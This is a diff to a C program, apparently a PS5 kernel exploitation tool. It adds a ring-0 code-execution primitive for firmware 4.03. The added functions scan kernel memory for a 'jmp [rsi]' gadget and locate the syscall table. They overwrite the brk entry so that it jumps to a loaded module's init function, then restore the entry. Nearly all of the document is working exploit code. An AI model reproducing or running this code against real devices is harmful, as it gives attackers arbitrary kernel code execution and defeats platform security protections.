@@ -117,6 +117,14 @@ extern const uint64_t KMOD_KO_SZ;
 /* Sentinel value in .ko that gets patched with DMAP-mapped output KVA */
 #define OUTPUT_KVA_SENTINEL 0xDEAD000000000000ULL
 
+/* Communication struct signature (must match kmod/hv_kld.c) */
+#define KMOD_COMM_SIGNATURE   0xCAFE1337BEEF5678ULL
+
+/* Offsets within the kmod_comm struct (must match kmod/hv_kld.c layout) */
+#define KMOD_COMM_OFF_OUTPUT_KVA   0x00  /* volatile uint64_t */
+#define KMOD_COMM_OFF_INIT_FUNC    0x08  /* void (*)(const void *) */
+#define KMOD_COMM_OFF_SIGNATURE    0x10  /* uint64_t */
+
 #define KMOD_FLAG_VMMCALL_ENUM     (1 << 0)
 #define KMOD_FLAG_VMMCALL_IOMMU    (1 << 1)
 #define KMOD_FLAG_VMCB_PROBE       (1 << 2)
@@ -1025,6 +1033,212 @@ static void campaign_iommu_recon(void) {
     }
 }
 
+/* ─── Kexec infrastructure (kernel code execution via sysent hijack) ─── */
+
+/*
+ * On PS5 FW 4.03, neither SYSINIT nor MOD_LOAD may fire during kldload.
+ * This implements a standalone kexec primitive using only the SDK's
+ * kernel R/W (kernel_copyin/kernel_copyout):
+ *
+ * 1. Find a "jmp qword ptr [rsi]" gadget (FF 26) in kernel .text
+ * 2. Find the sysent table in kernel .data
+ * 3. Hijack a syscall entry (brk/17) to point to the gadget
+ * 4. Calling syscall(17, func_ptr) → gadget reads func_ptr from
+ *    the args array (pointed to by rsi) and jumps to it in ring 0
+ * 5. Restore the original sysent entry afterward
+ */
+
+struct sysent_entry {
+    uint32_t sy_narg;           /* 0x00 */
+    uint32_t pad_04;            /* 0x04 */
+    uint64_t sy_call;           /* 0x08 */
+    uint64_t sy_auevent;        /* 0x10 */
+    uint64_t sy_systrace_args;  /* 0x18 */
+    uint32_t sy_entry;          /* 0x20 */
+    uint32_t sy_return;         /* 0x24 */
+    uint32_t sy_flags;          /* 0x28 */
+    uint32_t sy_thrcnt;         /* 0x2C */
+};
+
+#define SYSENT_SIZE  sizeof(struct sysent_entry)  /* 48 = 0x30 */
+#define KEXEC_SYSCALL  17   /* brk - safe to hijack temporarily */
+
+static uint64_t g_gadget_kva = 0;
+static uint64_t g_sysent_kva = 0;
+static struct sysent_entry g_orig_sysent;
+
+/* Find "jmp qword ptr [rsi]" (FF 26) in kernel text */
+static uint64_t find_jmp_rsi_gadget(void) {
+    printf("[*] Scanning kernel text for jmp [rsi] gadget...\n");
+    uint8_t buf[0x1000];
+    for (uint64_t addr = g_ktext_base; addr < g_kdata_base; addr += 0x1000) {
+        if (kernel_copyout(addr, buf, 0x1000) != 0)
+            continue;
+        for (int i = 0; i < 0x1000 - 1; i++) {
+            if (buf[i] == 0xFF && buf[i + 1] == 0x26) {
+                uint64_t found = addr + i;
+                printf("[+] Found jmp [rsi] at 0x%lx (ktext+0x%lx)\n",
+                       found, found - g_ktext_base);
+                return found;
+            }
+        }
+    }
+    printf("[-] jmp [rsi] gadget not found!\n");
+    return 0;
+}
+
+/*
+ * Find sysent table by matching known syscall arg counts:
+ *   0: nosys(0), 1: exit(1), 2: fork(0), 3: read(3),
+ *   4: write(3), 5: open(3), 6: close(1)
+ * All sy_call pointers must be in kernel text range.
+ */
+static uint64_t find_sysent_table(void) {
+    printf("[*] Scanning kernel data for sysent table...\n");
+    static const uint32_t narg[] = {0, 1, 0, 3, 3, 3, 1};
+    int checks = sizeof(narg) / sizeof(narg[0]);
+    uint8_t buf[0x1000];
+
+    for (uint64_t addr = g_kdata_base; addr < g_kdata_base + 0x2000000; addr += 0x1000) {
+        if (kernel_copyout(addr, buf, 0x1000) != 0)
+            continue;
+        for (int off = 0; off + (int)(checks * SYSENT_SIZE) <= 0x1000; off += 8) {
+            int match = 1;
+            for (int i = 0; i < checks && match; i++) {
+                struct sysent_entry *s =
+                    (struct sysent_entry *)(buf + off + i * SYSENT_SIZE);
+                if (s->sy_narg != narg[i] ||
+                    s->sy_call < (uint64_t)g_ktext_base ||
+                    s->sy_call >= (uint64_t)g_kdata_base) {
+                    match = 0;
+                }
+            }
+            if (match) {
+                uint64_t found = addr + off;
+                printf("[+] Found sysent at 0x%lx (kdata+0x%lx)\n",
+                       found, found - g_kdata_base);
+                for (int i = 0; i < checks; i++) {
+                    struct sysent_entry *s =
+                        (struct sysent_entry *)(buf + off + i * SYSENT_SIZE);
+                    printf("    [%d] narg=%u sy_call=0x%lx\n",
+                           i, s->sy_narg, s->sy_call);
+                }
+                return found;
+            }
+        }
+    }
+    printf("[-] sysent table not found!\n");
+    return 0;
+}
+
+/*
+ * Find the loaded kmod's g_comm struct in kernel memory.
+ * Searches for the patched output_kva value + KMOD_COMM_SIGNATURE.
+ * Returns the relocated init_func (hv_init's kernel VA).
+ */
+static uint64_t find_module_init_func(int kid, uint64_t patched_kva,
+                                       uint64_t *out_comm_kva) {
+    uint64_t hv_init_kva = 0;
+    uint8_t buf[0x1000];
+
+    /* Strategy 1: kldstat */
+    printf("[*] Trying kldstat(kid=%d)...\n", kid);
+    struct kld_file_stat kstat;
+    memset(&kstat, 0, sizeof(kstat));
+    kstat.version = sizeof(kstat);
+    int ret = syscall(SYS_kldstat, kid, &kstat);
+    printf("    ret=%d addr=0x%lx size=%lu name=%.32s\n",
+           ret, (unsigned long)kstat.address, (unsigned long)kstat.size, kstat.name);
+
+    if (ret == 0 && kstat.address != 0 && kstat.size != 0) {
+        for (uint64_t off = 0; off < kstat.size; off += 0x1000) {
+            uint64_t chunk = (kstat.size - off > 0x1000) ? 0x1000 : kstat.size - off;
+            if (kernel_copyout(kstat.address + off, buf, chunk) != 0) continue;
+            for (uint64_t j = 0; j + 24 <= chunk; j += 8) {
+                uint64_t val, sig;
+                memcpy(&val, buf + j, 8);
+                memcpy(&sig, buf + j + 0x10, 8);
+                if (val == patched_kva && sig == KMOD_COMM_SIGNATURE) {
+                    memcpy(&hv_init_kva, buf + j + 0x08, 8);
+                    if (out_comm_kva) *out_comm_kva = kstat.address + off + j;
+                    printf("[+] g_comm at 0x%lx, init_func=0x%lx\n",
+                           (unsigned long)(kstat.address + off + j),
+                           (unsigned long)hv_init_kva);
+                    return hv_init_kva;
+                }
+            }
+        }
+    }
+
+    /* Strategy 2: Memory scan */
+    printf("[*] Scanning kernel memory for g_comm...\n");
+    struct { uint64_t start, end; const char *name; } ranges[] = {
+        { g_kdata_base, g_kdata_base + 0x8000000, "kdata+128MB" },
+        { g_ktext_base > 0x8000000 ? g_ktext_base - 0x8000000 : 0,
+          g_ktext_base, "ktext-128MB" },
+        { g_dmap_base, g_dmap_base + 0x10000000, "dmap+256MB" },
+    };
+
+    for (int r = 0; r < 3; r++) {
+        printf("    Range: %s [0x%lx-0x%lx]\n", ranges[r].name,
+               (unsigned long)ranges[r].start, (unsigned long)ranges[r].end);
+        for (uint64_t addr = ranges[r].start; addr < ranges[r].end; addr += 0x1000) {
+            if (kernel_copyout(addr, buf, 0x1000) != 0) continue;
+            for (int off = 0; off + 24 <= 0x1000; off += 8) {
+                uint64_t val, sig;
+                memcpy(&val, buf + off, 8);
+                memcpy(&sig, buf + off + 0x10, 8);
+                if (val == patched_kva && sig == KMOD_COMM_SIGNATURE) {
+                    memcpy(&hv_init_kva, buf + off + 0x08, 8);
+                    if (out_comm_kva) *out_comm_kva = addr + off;
+                    printf("[+] g_comm at 0x%lx (%s), init_func=0x%lx\n",
+                           (unsigned long)(addr + off), ranges[r].name,
+                           (unsigned long)hv_init_kva);
+                    return hv_init_kva;
+                }
+            }
+        }
+    }
+
+    printf("[-] Module not found in kernel memory!\n");
+    return 0;
+}
+
+/* Hijack sysent[KEXEC_SYSCALL] → jmp [rsi] gadget */
+static int setup_kexec(void) {
+    if (!g_gadget_kva || !g_sysent_kva) return -1;
+    uint64_t target = g_sysent_kva + KEXEC_SYSCALL * SYSENT_SIZE;
+
+    kernel_copyout(target, &g_orig_sysent, sizeof(g_orig_sysent));
+    printf("[*] sysent[%d]: narg=%u sy_call=0x%lx\n",
+           KEXEC_SYSCALL, g_orig_sysent.sy_narg,
+           (unsigned long)g_orig_sysent.sy_call);
+
+    struct sysent_entry hijacked;
+    memcpy(&hijacked, &g_orig_sysent, sizeof(hijacked));
+    hijacked.sy_narg = 2;
+    hijacked.sy_call = g_gadget_kva;
+    hijacked.sy_flags = 0;
+    hijacked.sy_thrcnt = 1;
+
+    kernel_copyin(&hijacked, target, sizeof(hijacked));
+    printf("[+] Installed kexec (sy_call -> 0x%lx)\n", (unsigned long)g_gadget_kva);
+    return 0;
+}
+
+/* Restore original sysent entry - MUST call after kexec */
+static void restore_kexec(void) {
+    if (!g_sysent_kva) return;
+    uint64_t target = g_sysent_kva + KEXEC_SYSCALL * SYSENT_SIZE;
+    kernel_copyin(&g_orig_sysent, target, sizeof(g_orig_sysent));
+    printf("[+] Restored sysent[%d]\n", KEXEC_SYSCALL);
+}
+
+/* Execute a kernel function via the hijacked syscall */
+static int do_kexec(uint64_t func_ptr) {
+    return syscall(KEXEC_SYSCALL, func_ptr, 0);
+}
+
 /*
  * Campaign 7: Kernel Module via kldload
  *
@@ -1199,19 +1413,19 @@ static void campaign_kmod_kldload(void) {
             char *strtab = (char *)(ko_bytes + shdrs[symtab_sh->sh_link].sh_offset);
 
             for (uint64_t i = 0; i < nsyms; i++) {
-                if (strcmp(strtab + syms[i].st_name, "g_output_kva") == 0) {
+                if (strcmp(strtab + syms[i].st_name, "g_comm") == 0) {
                     uint16_t shndx = syms[i].st_shndx;
                     if (shndx < ehdr->e_shnum) {
                         uint64_t file_off = shdrs[shndx].sh_offset + syms[i].st_value;
                         if (file_off + 8 <= (size_t)KMOD_KO_SZ) {
                             uint64_t cur;
                             memcpy(&cur, ko_bytes + file_off, 8);
-                            printf("[+] ELF sym g_output_kva: section=%u, "
+                            printf("[+] ELF sym g_comm: section=%u, "
                                    "file_offset=0x%lx, current=0x%lx\n",
                                    shndx, (unsigned long)file_off,
                                    (unsigned long)cur);
                             memcpy(ko_bytes + file_off, &result_kva, 8);
-                            printf("[+] Patched g_output_kva -> 0x%lx\n",
+                            printf("[+] Patched g_comm.output_kva -> 0x%lx\n",
                                    (unsigned long)result_kva);
                             patched = 1;
                         }
@@ -1349,7 +1563,64 @@ static void campaign_kmod_kldload(void) {
         kernel_copyout(result_kva, &kc_results, sizeof(kc_results));
         printf("    kernel_copyout magic: 0x%llx\n",
                (unsigned long long)kc_results.magic);
-    } else {
+
+        /* === kexec fallback: manually invoke hv_init from ring 0 ===
+         *
+         * SYSINIT and MOD_LOAD both failed to fire on PS5 FW 4.03.
+         * The module IS loaded in kernel memory (kldload succeeded),
+         * so we can find hv_init's address via the g_comm struct
+         * and call it ourselves by hijacking a syscall entry.
+         *
+         * Strategy:
+         *   1. Find "jmp [rsi]" gadget in kernel text
+         *   2. Find sysent table in kernel data
+         *   3. Find g_comm in loaded module → read relocated init_func
+         *   4. Hijack sysent[17] → gadget, call hv_init, restore
+         */
+        printf("\n[*] Attempting kexec fallback to invoke hv_init...\n");
+
+        g_gadget_kva = find_jmp_rsi_gadget();
+        g_sysent_kva = find_sysent_table();
+
+        if (g_gadget_kva && g_sysent_kva) {
+            uint64_t comm_kva = 0;
+            uint64_t hv_init_kva = find_module_init_func(
+                kid, result_kva, &comm_kva);
+
+            if (hv_init_kva) {
+                printf("[+] hv_init kernel VA: 0x%lx\n",
+                       (unsigned long)hv_init_kva);
+
+                if (setup_kexec() == 0) {
+                    printf("[*] Invoking hv_init via kexec "
+                           "(syscall %d)...\n", KEXEC_SYSCALL);
+                    do_kexec(hv_init_kva);
+                    restore_kexec();
+                    printf("[+] kexec returned, sysent restored.\n");
+
+                    /* Let DMAP writes propagate */
+                    usleep(10000);
+
+                    /* Re-check the shared buffer */
+                    memcpy(&first_qword, (void *)result_vaddr,
+                           sizeof(first_qword));
+                    printf("[*] After kexec: first_qword=0x%llx, "
+                           "magic=0x%llx\n",
+                           (unsigned long long)first_qword,
+                           (unsigned long long)results->magic);
+                } else {
+                    printf("[-] Failed to set up kexec.\n");
+                }
+            } else {
+                printf("[-] Could not find hv_init in kernel memory.\n");
+            }
+        } else {
+            printf("[-] Could not find gadget/sysent for kexec.\n");
+        }
+    }
+
+    /* Display results - either SYSINIT/MOD_LOAD or kexec may have succeeded */
+    if (results->magic == KMOD_MAGIC) {
         printf("[+] KMOD_MAGIC found! Shared memory communication working!\n");
         printf("[+] Kmod status: %s\n",
                results->status == KMOD_STATUS_DONE ? "COMPLETE" :
@@ -1404,6 +1675,8 @@ static void campaign_kmod_kldload(void) {
             printf("    Campaign %u, probe %u\n",
                    results->current_campaign, results->current_probe);
         }
+    } else {
+        printf("[-] All init paths exhausted - hv_init never executed.\n");
     }
 
     /* Step 5: Unload the module */
